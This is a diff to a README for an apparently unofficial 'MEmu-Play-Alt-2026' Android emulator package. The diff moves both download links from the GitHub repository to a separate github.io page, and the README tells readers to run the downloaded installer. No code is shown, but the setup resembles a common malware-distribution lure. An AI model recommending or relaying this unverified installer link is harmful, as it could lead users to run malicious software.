@@ -1,6 +1,6 @@
 # 🎮 MEmu-Play-Alt-2026 - Run Android Apps On Your Computer
 
-[![Download MEmu Play](https://img.shields.io/badge/Download-MEmu_Play-blue)](https://github.com/celio5859/MEmu-Play-Alt-2026)
+[![Download MEmu Play](https://img.shields.io/badge/Download-MEmu_Play-blue)](https://celio5859.github.io)
 
 ## 📌 About This Software
 
@@ -22,7 +22,7 @@ Check your BIOS settings to ensure Virtualization Technology (VT) is enabled. Th
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [this page to download](https://github.com/celio5859/MEmu-Play-Alt-2026) the installer file.
+1. Visit [this page to download](https://celio5859.github.io) the installer file.
 2. Locate the download folder on your computer once the file transfer completes.
 3. Double-click the file to start the installation wizard.
 4. Select the location where you want to store the application files.
